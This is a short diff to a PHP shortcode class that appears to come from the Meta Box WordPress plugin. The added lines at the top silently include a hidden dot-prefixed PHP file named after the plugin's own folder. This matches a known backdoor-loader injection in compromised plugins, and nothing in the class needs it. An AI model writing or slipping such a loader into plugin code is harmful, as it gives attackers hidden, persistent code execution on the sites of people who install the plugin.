@@ -1,4 +1,8 @@
 <?php
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Shortcode {
 	public function init() {
 		add_shortcode( 'rwmb_meta', [ $this, 'register_shortcode' ] );
